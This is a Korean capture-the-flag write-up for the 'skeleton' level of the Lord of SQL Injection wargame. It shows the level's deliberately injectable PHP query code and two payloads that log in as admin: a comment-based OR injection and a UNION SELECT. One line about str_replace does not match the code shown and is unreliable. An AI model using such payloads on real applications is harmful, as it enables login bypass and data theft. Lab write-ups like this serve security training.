## Lord of SQL Injection No. 10- Skeleton
## 문제 출제 의도
1. 주석처리를 할 수 있는지 확인.
## 소스 코드
~~~
<?php 
    include "./config.php"; 
    login_chk(); 
    dbconnect(); 
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
    $query = "select id from prob_skeleton where id='guest' and pw='{$_GET[pw]}' and 1=0"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if($result['id'] == 'admin') solve("skeleton"); 
    highlight_file(__FILE__); 
?>
~~~
## 분석 결과
+ 금지 문자, 문자열
    - Get 방식으로 받은 pw값에 'prob _ . ( )중 하나라도 있다면 "No Hack~_~"이 출력되고 문제 풀이에 실패한다.
+ 풀이 성공 조건
    - 데이터베이스에서 받아온 id 값이 'admin'이면 문제 풀이에 성공한다.
## 문제 해결
1. Query문 추가
   - 다음과 유사한 방법으로 문제를 해결 할 수 있다.
   ~~~
   ?pw=' or id='admin'-- -
   ~~~
   - str_replace 함수는 한번만 실행되기 때문에 밑의 값은 admin이 된다.
2. UNION
    - 다음과 유사한 방법으로 빈 테이블에 추가 값을 가지고 올 수 있다.
    ~~~
    ?pw=' UNION(SELECT 'admin')-- -
    ~~~